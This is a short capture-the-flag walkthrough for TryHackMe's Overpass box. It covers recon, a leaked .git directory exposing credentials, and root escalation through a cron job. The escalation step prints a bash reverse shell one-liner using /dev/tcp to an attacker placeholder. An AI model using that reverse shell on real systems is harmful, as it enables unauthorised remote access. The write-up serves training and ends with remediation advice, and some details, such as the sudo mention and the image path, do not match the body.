---
title: 'THM Walkthrough: Overpass'
description: >-
  Privilege escalation via weak sudo permissions and password reuse on
  TryHackMe's Overpass box.
date: 2026-08-06T00:00:00.000Z
category: TryHackMe
tags:
  - tryhackme
  - linux
  - sudo
  - privilege-escalation
platform: TryHackMe
difficulty: Easy
image: /images/htb-cypher/htb1.png
slug: thm-overpass
dateModified: '2026-08-09'
---

# Reconnaissance

Starting with a full port scan:

```bash
nmap -sC -sV -oA overpass 10.10.11.XXX
```

### Open Ports

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.0 |
| 80 | HTTP | Apache 2.4.41 |

## Enumeration

The web page hosts a password manager called Overpass. Checking the source code:

```bash
gobuster dir -u http://10.10.11.XXX -w /usr/share/wordlists/dirb/common.txt
```

Found a `.git` directory exposed.

## Exploitation

Dumped the git repository and found credentials in the commit history:

```bash
git log --oneline
git show <commit>:src/Seven/login.js
```

Extracted username and password, logged in via SSH.

## Privilege Escalation

Found a cron job running as root:

```bash
cat /etc/crontab
```

```bash
# As root
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```

## Flags

```
user.txt: 3******************************
root.txt: f******************************
```

## Remediation

- Never expose `.git` directories in production
- Avoid storing credentials in source control
- Restrict cron jobs to specific user contexts
